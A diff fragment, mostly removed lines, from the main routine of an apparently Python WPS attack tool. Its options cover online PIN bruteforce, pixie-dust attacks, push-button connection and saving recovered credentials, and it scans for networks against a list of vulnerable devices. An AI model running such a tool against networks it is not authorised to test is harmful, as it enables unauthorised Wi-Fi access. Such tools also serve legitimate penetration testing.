-        help='Run online bruteforce attack'
-        )
-    parser.add_argument(
-        '--pbc', '--push-button-connect',
-        action='store_true',
-        help='Run WPS push button connection'
-        )
-    parser.add_argument(
-        '-d', '--delay',
-        type=float,
-        help='Set the delay between pin attempts'
-        )
-    parser.add_argument(
-        '-w', '--write',
-        action='store_true',
-        help='Write credentials to the file on success'
-        )
-    parser.add_argument(
-        '--iface-down',
-        action='store_true',
-        help='Down network interface when the work is finished'
-        )
-    parser.add_argument(
-        '--vuln-list',
-        type=str,
-        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
-        help='Use custom file with vulnerable devices list'
-    )
-    parser.add_argument(
-        '-l', '--loop',
-        action='store_true',
-        help='Run in a loop'
-    )
-    parser.add_argument(
-        '-r', '--reverse-scan',
-        action='store_true',
-        help='Reverse order of networks in the list of networks. Useful on small displays'
-    )
-    parser.add_argument(
-        '--mtk-wifi',
-        action='store_true',
-        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
-             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
-             'Turn off Wi-Fi in the system settings before using this.'
-    )
-    parser.add_argument(
-        '-v', '--verbose',
-        action='store_true',
-        help='Verbose output'
-        )
-
-    args = parser.parse_args()
-
-    if sys.hexversion < 0x03060F0:
-        die("The program requires Python 3.6 and above")
-    if os.getuid() != 0:
-        die("Run it as root")
-
-    if args.mtk_wifi:
-        wmtWifi_device = Path("/dev/wmtWifi")
-        if not wmtWifi_device.is_char_device():
-            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
-                "/dev/wmtWifi does not exist or it is not a character device")
-        wmtWifi_device.chmod(0o644)
-        wmtWifi_device.write_text("1")
-
-    if not ifaceUp(args.interface):
-        die('Unable to up interface "{}"'.format(args.interface))
-
-    while True:
-        try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.pbc:
-                companion.single_connection(pbc_mode=True)
-            else:
-                if not args.bssid:
-                    try:
-                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                            vuln_list = file.read().splitlines()
-                    except FileNotFoundError:
-                        vuln_list = []
-                    scanner = WiFiScanner(args.interface, vuln_list)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid)  scanning for available networks')
-                    args.bssid = scanner.prompt_network()
-
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.bruteforce:
-                        start_pin_value = args.pin if args.pin else None
-                        companion.smart_bruteforce(args.bssid, start_pin=start_pin_value, delay=args.delay)
-                    else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
-                                                    args.show_pixie_cmd, args.pixie_force)
-            if not args.loop:
-                break
-            else:
-                args.bssid = None
-        except KeyboardInterrupt:
-            if args.loop:
-                if input("\\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting")
-                    break
-                else:
-                    args.bssid = None
-            else:
-                print("\\nAborting")
-                break
-
-    if args.iface_down:
-        ifaceUp(args.interface, down=True)
-
-    if args.mtk_wifi:
-        wmtWifi_device.write_text("0")
+            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'WPS:
